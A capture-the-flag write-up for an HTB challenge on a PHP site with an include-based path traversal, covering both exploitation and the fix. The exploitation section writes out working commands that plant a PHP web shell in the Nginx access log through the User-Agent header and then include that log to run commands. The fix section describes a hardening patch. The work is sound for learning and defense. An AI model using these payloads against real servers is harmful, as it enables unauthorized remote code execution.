---
ctf: HTBLabs
title: Secure Server
category: misc
difficulty: unknown
tags: [php, lfi, path-traversal, log-poisoning, samba]
flag_format: HTB{...}
date: 2026-08-11
---

# Secure Server

## Challenge

Bobby made a secure server, but someone got in! How did they get in? Can you stop it from happening again? IPs: 154.57.164.65:32570, 154.57.164.65:32179, 154.57.164.65:31187 

## Approach

### Service identification

The three forwarded ports had different roles:

- `32179/tcp`: Nginx/PHP website
- `31187/tcp`: anonymous Samba share named `app`
- `32570/tcp`: challenge checker

The Samba share exposed the live contents of `/www/app` and permitted replacing
the vulnerable PHP file.

### Source review

`our-projects.php` originally used the attacker-controlled `project` parameter
directly in a PHP include:

```php
$project = strtolower($_GET["project"]);
include "../projects/" . $project;
```

This created two related vulnerabilities:

1. `../` sequences allowed local file inclusion (LFI) outside the projects
   directory.
2. `include` interpreted PHP code in the selected file rather than treating the
   project as data.

Nginx's custom access-log format recorded the complete User-Agent header. This
made it possible to write PHP into `/var/log/nginx/access.log`, include that log
through the traversal, and obtain command execution as `www-data`.

### Exploitation

First, poison the access log with PHP in the User-Agent:

```bash
curl -A '<?php system($_GET["c"]); ?>' \
  http://154.57.164.65:32179/
```

Then traverse from `/www/app/our-projects.php` to the Nginx log and supply a
command:

```bash
curl --get \
  --data-urlencode 'project=../../../../var/log/nginx/access.log' \
  --data-urlencode 'c=id' \
  http://154.57.164.65:32179/our-projects.php
```

This returned command output from the poisoned log, confirming RCE as:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Process enumeration also showed the checker listening internally on port 1337,
the Nginx service, and Samba.

### Remediation

A fixed allowlist containing only `orion`, `ares`, and `ceres` stopped traversal,
but the checker creates temporary project files to verify that the site remains
dynamic. A fixed list therefore broke required functionality.

The final fix accepts only safe filename characters, verifies the file exists,
escapes the project name displayed in the heading, and reads project content as
data with `file_get_contents()` instead of executing it with `include`:

```php
$project = "orion";

if (isset($_GET["project"])) {
    $requestedProject = strtolower($_GET["project"]);

    if (preg_match('/\A[a-z0-9_-]+\z/D', $requestedProject)
        && is_file("../projects/" . $requestedProject)) {
        $project = $requestedProject;
    }
}
```

```php
<h1><?= htmlspecialchars(ucfirst($project), ENT_QUOTES, 'UTF-8') ?></h1>
<p><?= file_get_contents("../projects/" . $project) ?></p>
```

The patched file was uploaded through the challenge's Samba share:

```bash
smbclient //154.57.164.65/app -p 31187 -N \
  -c 'put "Secure Server/secure_server/challenge/app/our-projects.php" our-projects.php'
```

Finally, connecting to the checker confirmed that the three original projects
and a generated project remained dynamic, and that both vulnerabilities were
removed:

```bash
nc 154.57.164.65 32570
```

```text
[+] All pages are dynamic
[+] Vulnerabilities removed

Congratulations, you have successfully completed the challenge!
Flag: HTB{redacted}
```

## Tools

- `rg` and `sed` for source inspection
- `curl` for web testing and log poisoning
- `nmap` and `nc` for service identification and checker access
- `smbclient` for accessing and updating the live application share
- `php -l` for validating the patched PHP syntax

## Lessons

- Never concatenate untrusted input into `include`, `require`, or similar PHP
  execution primitives.
- Path validation must preserve legitimate functionality. A strict filename
  policy plus an existence check worked here; a three-item allowlist did not.
- Files that contain content should be read as data, not executed as source code.
- Log poisoning turns an LFI into RCE when logs contain attacker-controlled data
  and are passed to a PHP include.
- Writable application shares significantly increase the impact of a web flaw
  and should not permit anonymous write access in production.

## Flag

`HTB{redacted}`
